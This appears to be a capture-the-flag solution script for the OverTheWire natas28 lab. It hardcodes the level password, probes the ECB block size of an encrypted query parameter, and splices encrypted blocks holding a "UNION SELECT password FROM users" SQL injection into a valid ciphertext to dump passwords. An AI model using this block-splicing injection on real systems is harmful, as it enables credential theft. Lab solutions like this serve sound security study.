import requests
import string
import urllib
import base64
import re

USERNAME = "natas28"
PASSWORD = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

URL = "http://natas28.natas.labs.overthewire.org"

session = requests.Session()
# response = session.get(URL, auth=(USERNAME, PASSWORD))

def make_post_request(query):
    return session.post(URL, auth=(USERNAME, PASSWORD), data={"query": query})

def get_block_length_and_index():
    """
    Raise the query length by 1 each request until the response length changes.
    Ignore the first one because we don't know how much is prepended to our query.
    Return tuple (index, block_length)
    index - the character index of which we step into the next block
    block_length - block length
    """
    growth_iter = 0
    change_index = 0
    prev_length = len(base64.b64decode(requests.utils.unquote(make_post_request("a").url[60:])))
    for i in range(80):
        response = make_post_request("a" * i)
        length = len(base64.b64decode(requests.utils.unquote(response.url[60:])))
        if length > prev_length:
            growth_iter += 1
            if growth_iter == 1 and change_index == 0:
                change_index = i
            if growth_iter > 1:
                block_length = length - prev_length
                break
            prev_length = length

    return block_length, change_index

def get_offset(block_length, change_index):
    "Function used to calculate which characted causes the 3rd block to change"
    for i in range(change_index):
        response = make_post_request("a" * i)
        print("======================")
        print("Query length:", i)
        for block in range(int(80/block_length)):
            print("Block:", block, "Data:", base64.b64decode(requests.utils.unquote(response.url[60:]))[block * block_length: (block + 1) * block_length])

def get_final_char():
    correct_string = repr(b'\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb') 
    block = 2
    for i in string.printable:
        print("Trying:", i)
        response = make_post_request(('a' * 9) + i)
        answer = repr(base64.b64decode(requests.utils.unquote(response.url[60:]))[block * block_length:(block + 1) * block_length])
        if correct_string == answer:
            return i

# block_length, change_index = get_block_length_and_index()
# print(block_length, change_index)
block_length = 16
change_index = 13

# get_offset(block_length, change_index)
# print(get_final_char()) # %

injection = b'a' * 9 + b"' UNION SELECT password FROM users; #"

blocks = int((len(injection) - 10) / block_length)
if (len(injection) - 10) % block_length != 0: blocks += 1

response = make_post_request(injection)
raw_inject = base64.b64decode(requests.utils.unquote(response.url[60:]))

filler_response = make_post_request("a" * 10)
good_base = base64.b64decode(requests.utils.unquote(filler_response.url[60:]))

query_url = good_base[:block_length * 3] + raw_inject[block_length * 3: block_length * 3 + (blocks * block_length)] + good_base[block_length * 3:]

query = requests.utils.quote(base64.b64encode(query_url)).replace("/", "%2F")

flag = session.get(URL + '/search.php/?query=' + query, auth=(USERNAME, PASSWORD))
print(re.findall("<li>(.*)</li>", flag.text)[0])



